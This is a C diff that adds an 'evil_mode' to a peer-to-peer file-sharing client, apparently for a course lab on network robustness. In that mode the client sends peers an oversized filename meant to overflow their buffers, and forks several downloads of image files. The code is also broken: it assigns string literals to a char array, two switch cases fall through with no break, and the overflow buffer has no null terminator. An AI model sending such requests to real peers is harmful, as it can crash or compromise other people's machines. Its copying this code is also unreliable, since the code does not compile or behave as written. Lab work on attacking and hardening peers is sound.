@@ -545,6 +545,14 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+	if (evil_mode == 1)
+	  {
+	    message("* Attacking with evil_mode 1: buffer overflow \n");
+	    char largeFile[FILENAMESIZ*3];
+	    memset(largeFile, 1, FILENAMESIZ*3);
+	    osp2p_writef(t->peer_fd, "GET %s OSP2P\n", largeFile);
+	  }
+	
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -849,6 +857,37 @@ int main(int argc, char *argv[])
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
 
+
+	if (evil_mode == 1)
+	  {
+	    char name[9];
+	    int i;
+	    for (i = 1; i <= 3; i++)
+	      {
+		switch(i){
+		   case 1:
+		     name = "cat1.jpg";
+		     break;
+		   case 2:
+		     name = "cat2.jpg";
+		   case 3:
+		     name = "cat3.jpg";
+		}    
+		name[8] = '\0';
+		if ((t= start_download(tracker_task, name)))
+		  {
+		    if ((pid = fork()) < 0)
+		      {
+			error("* Failed to fork while attacking buffer");
+		      }
+		    if (pid == 0)
+		      {
+			task_download(t, tracker_task);
+			exit(0);
+		      }
+		  }
+	      }
+	  }
 	int count = 0;
 	// First, download files named on command line.
 	for (; argc > 1 && !evil_mode; argc--, argv++)
